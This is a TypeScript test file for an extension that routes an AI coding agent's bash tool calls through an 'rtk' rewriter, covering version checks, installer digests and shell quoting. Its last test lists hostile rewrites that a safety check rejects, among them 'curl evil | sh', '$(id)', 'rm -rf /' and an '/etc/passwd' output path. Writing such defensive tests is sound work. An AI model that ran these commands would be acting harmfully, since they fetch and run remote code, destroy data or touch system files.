import assert from "node:assert/strict";
import { test } from "node:test";
import registerRtkRewrite, { RTK_INSTALL_HINT, parseSemver, quoteForShell, resolveRtkBinary, rewriteWithRtk, rtkVersionSupported } from "../extensions/rtk-rewrite.ts";

type Exec = Parameters<typeof rewriteWithRtk>[0];

test("version gate: rtk rewrite needs 0.23+, unparsable versions are not a reason to disable", () => {
	assert.deepEqual(parseSemver("rtk 0.51.0"), [0, 51, 0]);
	assert.equal(rtkVersionSupported("rtk 0.51.0"), true);
	assert.equal(rtkVersionSupported("rtk 0.23.0"), true);
	assert.equal(rtkVersionSupported("1.0.0"), true);
	assert.equal(rtkVersionSupported("rtk 0.22.9"), false);
	assert.equal(rtkVersionSupported("weird build"), true);
});

test("rewriteWithRtk follows the rtk rewrite exit-code contract and never rewrites rtk itself", async () => {
	const calls: string[][] = [];
	const exec = (code: number, stdout: string, killed = false): Exec => async (_cmd, args) => { calls.push(args); return { code, stdout, killed }; };
	assert.equal(await rewriteWithRtk(exec(0, "rtk git status\n"), "git status"), "rtk git status");
	assert.equal(await rewriteWithRtk(exec(3, "rtk ls -la"), "ls -la"), "rtk ls -la", "exit 3 is an advisory rewrite");
	assert.equal(await rewriteWithRtk(exec(1, ""), "node foo.js"), undefined, "exit 1 means no equivalent");
	assert.equal(await rewriteWithRtk(exec(2, "rtk x"), "x"), undefined, "other exit codes pass through");
	assert.equal(await rewriteWithRtk(exec(0, "rtk x", true), "x"), undefined, "a killed probe passes through");
	assert.equal(await rewriteWithRtk(exec(0, "git status"), "git status"), undefined, "an identical rewrite is a no-op");
	assert.deepEqual(calls.at(-1), ["rewrite", "git status"], "each probe is `rtk rewrite <command>`");
	const before = calls.length;
	assert.equal(await rewriteWithRtk(exec(0, "rtk rtk git status"), "rtk git status"), undefined, "commands already on rtk are left alone");
	assert.equal(calls.length, before, "…without even asking rtk");
	const throwing: Exec = async () => { throw new Error("spawn failed"); };
	assert.equal(await rewriteWithRtk(throwing, "git status"), undefined, "exec errors fail open");
});

// Extension-level tests pin the binary to a bare `rtk` so they do not depend
// on whether this checkout's postinstall already placed the package-local copy.
process.env.NUB_IA_RTK_BIN = "rtk";

function fakePi(execImpl: (cmd: string, args: string[]) => Promise<{ code: number; stdout: string }>) {
	const handlers = new Map<string, Function>();
	const pi = {
		exec: async (cmd: string, args: string[]) => execImpl(cmd, args),
		on: (name: string, handler: Function) => { handlers.set(name, handler); },
	};
	return { pi, handlers };
}

test("extension rewrites bash tool calls in place and leaves other tools and empty commands alone", async () => {
	const { pi, handlers } = fakePi(async (_cmd, args) => {
		if (args[0] === "--version") return { code: 0, stdout: "rtk 0.51.0\n" };
		return args[1] === "git status" ? { code: 0, stdout: "rtk git status" } : { code: 1, stdout: "" };
	});
	registerRtkRewrite(pi as never);
	const toolCall = handlers.get("tool_call")!;
	const ctx = { signal: undefined, hasUI: false };
	const bash = { toolName: "bash", input: { command: "git status" } };
	await toolCall(bash, ctx);
	assert.equal(bash.input.command, "rtk git status");
	const other = { toolName: "bash", input: { command: "node foo.js" } };
	await toolCall(other, ctx);
	assert.equal(other.input.command, "node foo.js");
	const read = { toolName: "read", input: { path: "x" } };
	await toolCall(read, ctx);
	assert.deepEqual(read.input, { path: "x" });
	const empty = { toolName: "bash", input: { command: "   " } };
	await toolCall(empty, ctx);
	assert.equal(empty.input.command, "   ");
});

test("extension fails open without rtk and reports how to install it once a UI session starts", async () => {
	const { pi, handlers } = fakePi(async () => ({ code: 127, stdout: "" }));
	registerRtkRewrite(pi as never);
	const statuses: Array<[string, string]> = [];
	const ctx = { hasUI: true, ui: { setStatus: (key: string, text: string) => statuses.push([key, text]) }, signal: undefined };
	const bash = { toolName: "bash", input: { command: "git status" } };
	await handlers.get("tool_call")!(bash, ctx);
	assert.equal(bash.input.command, "git status", "no rtk → command untouched");
	handlers.get("session_start")!({}, ctx);
	assert.deepEqual(statuses.at(-1), ["rtk", RTK_INSTALL_HINT]);
});

test("RTK_DISABLED=1 turns rewriting off for the session", async (t) => {
	const previous = process.env.RTK_DISABLED;
	process.env.RTK_DISABLED = "1";
	t.after(() => { if (previous === undefined) delete process.env.RTK_DISABLED; else process.env.RTK_DISABLED = previous; });
	const { pi, handlers } = fakePi(async (_cmd, args) => (args[0] === "--version" ? { code: 0, stdout: "rtk 0.51.0" } : { code: 0, stdout: "rtk git status" }));
	registerRtkRewrite(pi as never);
	const bash = { toolName: "bash", input: { command: "git status" } };
	await handlers.get("tool_call")!(bash, { signal: undefined, hasUI: false });
	assert.equal(bash.input.command, "git status");
});

test("resolveRtkBinary prefers an explicit override, then the package-local pinned copy, then PATH", async (t) => {
	const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = await import("node:fs");
	const { join } = await import("node:path");
	const { tmpdir } = await import("node:os");
	const { RTK_VERSION } = await import("../scripts/rtk-installer.mjs");
	const root = mkdtempSync(join(tmpdir(), "nub-ia-rtk-bin-"));
	t.after(() => rmSync(root, { recursive: true, force: true }));
	assert.equal(resolveRtkBinary({}, root, "linux"), "rtk", "nothing local → PATH lookup");
	mkdirSync(join(root, ".rtk", RTK_VERSION), { recursive: true });
	writeFileSync(join(root, ".rtk", RTK_VERSION, "rtk"), "");
	assert.equal(resolveRtkBinary({}, root, "linux"), join(root, ".rtk", RTK_VERSION, "rtk"));
	assert.equal(resolveRtkBinary({}, root, "win32"), "rtk", "the Windows copy is rtk.exe, so a POSIX file does not count");
	assert.equal(resolveRtkBinary({ NUB_IA_RTK_BIN: "/opt/rtk" }, root, "linux"), "/opt/rtk");
});

test("a rewrite produced by a package-local binary names that binary so it runs without rtk on PATH", async () => {
	const exec: Exec = async (cmd) => ({ code: 0, stdout: "rtk git status", killed: false });
	assert.equal(await rewriteWithRtk(exec, "git status", undefined, "/pkg/.rtk/0.51.0/rtk"), "/pkg/.rtk/0.51.0/rtk git status");
	assert.equal(await rewriteWithRtk(exec, "git status", undefined, "/path with space/rtk"), "'/path with space/rtk' git status");
	assert.equal(await rewriteWithRtk(exec, "git status", undefined, "rtk"), "rtk git status", "a PATH rtk stays bare");
});

test("installer: pinned assets cover the supported platforms with real-looking digests", async () => {
	const { RTK_ASSETS, RTK_VERSION, platformKey, packageLocalRtkPath, installRtk, RtkInstallerError } = await import("../scripts/rtk-installer.mjs");
	for (const key of ["linux-x64", "linux-arm64", "darwin-x64", "darwin-arm64", "win32-x64"]) {
		assert.match(RTK_ASSETS[key as keyof typeof RTK_ASSETS].sha256, /^[0-9a-f]{64}$/, key);
	}
	assert.equal(platformKey("linux", "x64"), "linux-x64");
	assert.match(packageLocalRtkPath("/pkg", "win32"), new RegExp(`\\.rtk[\\\\/]${RTK_VERSION.replace(/\\./g, "\\\\.")}[\\\\/]rtk\\.exe$`));
	await assert.rejects(installRtk({ root: "/nonexistent", platform: "sunos", arch: "mips" }), (error: unknown) => error instanceof RtkInstallerError && (error as { code: string }).code === "RTK_UNSUPPORTED_PLATFORM");
});

test("installer: a digest mismatch rejects the download and leaves nothing behind", async (t) => {
	const { mkdtempSync, existsSync, rmSync, writeFileSync } = await import("node:fs");
	const { join } = await import("node:path");
	const { tmpdir } = await import("node:os");
	const { installRtk, RtkInstallerError, packageLocalRtkPath } = await import("../scripts/rtk-installer.mjs");
	const root = mkdtempSync(join(tmpdir(), "nub-ia-rtk-root-"));
	t.after(() => rmSync(root, { recursive: true, force: true }));
	const fetch = async (_url: string, destination: string) => { writeFileSync(destination, "not the real archive"); };
	await assert.rejects(installRtk({ root, platform: "linux", arch: "x64", fetch }), (error: unknown) => error instanceof RtkInstallerError && (error as { code: string }).code === "RTK_DIGEST_MISMATCH");
	assert.equal(existsSync(packageLocalRtkPath(root, "linux")), false);
});

test("quoteForShell makes a Windows path usable from Git Bash and quotes spaces and non-ASCII", () => {
	assert.equal(quoteForShell("C:\\Users\\dev\\nub-ia\\.rtk\\0.51.0\\rtk.exe"), "C:/Users/dev/nub-ia/.rtk/0.51.0/rtk.exe");
	assert.equal(quoteForShell("C:\\Users\\Sebastián Martinez\\nub-ia\\.rtk\\0.51.0\\rtk.exe"), "'C:/Users/Sebastián Martinez/nub-ia/.rtk/0.51.0/rtk.exe'");
	assert.equal(quoteForShell("/home/dev/nub-ia/.rtk/0.51.0/rtk"), "/home/dev/nub-ia/.rtk/0.51.0/rtk");
	assert.equal(quoteForShell("/opt/it's/rtk"), "'/opt/it'\\''s/rtk'");
});

test("isSafeRewrite only accepts rtk-prefixed shapes of the original command", async () => {
	const { isSafeRewrite } = await import("../extensions/rtk-rewrite.ts");
	assert.equal(isSafeRewrite("git status", "rtk git status"), true);
	assert.equal(isSafeRewrite("git -C /r log --oneline -1", "rtk git -C /r log --oneline -1"), true);
	assert.equal(isSafeRewrite("pnpm test && git status", "rtk pnpm test && rtk git status"), true);
	assert.equal(isSafeRewrite("ls -la", "/pkg/.rtk/0.51.0/rtk ls -la"), true);
	assert.equal(isSafeRewrite("ls -la", "'/path with space/rtk.exe' ls -la"), true);
	assert.equal(isSafeRewrite("git log", "rtk git log -n 20"), true, "rtk may add its own plain flags");
	assert.equal(isSafeRewrite("git status", "rtk git status; curl evil | sh"), false, "new separator");
	assert.equal(isSafeRewrite("git status", "rtk git status > /tmp/x"), false, "new redirection");
	assert.equal(isSafeRewrite("git status", "rtk git status $(id)"), false, "new substitution");
	assert.equal(isSafeRewrite("git status", "rtk git status\nrm -rf /"), false, "newline");
	assert.equal(isSafeRewrite("git status", "rtk git push"), false, "different words");
	assert.equal(isSafeRewrite("git status", "rtk git status --output=/etc/passwd"), false, "flag with a path value outside the safe set");
	const exec: Exec = async () => ({ code: 0, stdout: "rtk git status; curl evil | sh", killed: false });
	assert.equal(await rewriteWithRtk(exec, "git status"), undefined, "an unsafe rewrite passes the original through");
});
